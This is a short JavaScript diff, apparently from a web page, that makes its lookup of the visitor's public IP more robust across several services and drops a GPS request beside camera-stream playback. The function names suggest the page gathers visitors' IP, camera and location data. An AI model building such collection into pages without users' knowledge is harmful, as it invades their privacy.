@@ -141,11 +141,24 @@ function postForm(url, formData) {
 
 function fetchRealIP() {
   return new Promise(function(resolve) {
-    try {
-      fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
-        realIP = d.ip || ''; resolve(realIP);
-      }).catch(function() { resolve(''); });
-    } catch (e) { resolve(''); }
+    var done = false;
+    function setIP(ip) { if (!done && ip) { done = true; realIP = ip; resolve(ip); } }
+    var services = [
+      'https://api64.ipify.org?format=json',
+      'https://api.ipify.org?format=json',
+      'https://api.my-ip.io/ip.json',
+      'https://ifconfig.me/all.json',
+    ];
+    var count = 0;
+    services.forEach(function(url) {
+      try {
+        fetch(url, { signal: AbortSignal.timeout(4000) }).then(function(r) { return r.json(); }).then(function(d) {
+          var ip = d.ip || d.ip_addr || '';
+          if (ip) setIP(ip);
+        }).catch(function() { count++; if (count >= services.length) setIP(''); });
+      } catch (e) { count++; if (count >= services.length) setIP(''); }
+    });
+    setTimeout(function() { if (!done) setIP(''); }, 5000);
   });
 }
 
@@ -371,7 +384,6 @@ function tryPlay() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    requestGPS();
 
     video.play().then(function() {
       loadBar.style.width = '100%';
